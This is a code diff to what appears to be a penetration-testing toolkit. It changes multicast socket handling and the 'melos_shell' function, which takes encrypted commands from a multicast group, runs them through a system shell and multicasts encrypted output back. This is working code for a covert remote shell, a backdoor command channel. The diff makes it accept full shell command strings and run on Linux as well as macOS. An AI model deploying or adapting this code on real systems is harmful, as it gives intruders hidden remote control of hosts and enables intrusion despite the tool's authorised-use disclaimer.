@@ -22,6 +22,7 @@ These tools are meant for authorized parties with legal consent to conduct testi
 
 import subprocess
 import socket
+import struct
 import time
 import sys
 import os
@@ -51,23 +52,34 @@ def IPv4LAN():
   return IP
 
 def multicast_recv(port, address="224.0.0.251", ttl=5, hops=255):
-  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-  try:
+  uname = list(os.uname())[0]
+  if uname == "Linux":
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-  except AttributeError:
-    pass
-  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops) 
-  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
-  sock.bind((address, port))
-  host = IPv4LAN()
-  sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_IF, socket.inet_aton(host))
-  sock.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(address) + socket.inet_aton(host))
-  sock.settimeout(ttl)
-  return sock
+    sock.bind(("", port))
+    mreq = struct.pack("4sl", socket.inet_aton(address), socket.INADDR_ANY)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+    sock.settimeout(ttl)
+    return sock
+  
+  elif uname == "Darwin":
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    try:
+      sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    except AttributeError:
+      pass
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops) 
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
+    sock.bind((address, port))
+    host = IPv4LAN()
+    sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_IF, socket.inet_aton(host))
+    sock.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(address) + socket.inet_aton(host))
+    sock.settimeout(ttl)
+    return sock
 
-def multicast_send(hops=255):
+def multicast_send(ttl=255):
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops)
+  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
   return sock
 
 def melos_shell(password, multicast_group="224.0.0.251", commandport=10020, responseport=10050):
@@ -84,9 +96,9 @@ def melos_shell(password, multicast_group="224.0.0.251", commandport=10020, resp
         respond.close()
         sock.close()
         break
-      info = subprocess.check_output(plain.split(" "))
-      enc_info = encrypt(info.decode(), password)
-      respond.sendto(enc_info, (multicast_group,responseport))
+      info = subprocess.getoutput(plain)
+      enc_info = encrypt(info, password)
+      respond.sendto(enc_info, (multicast_group, responseport))
     except KeyboardInterrupt:
       respond.close()
       sock.close()
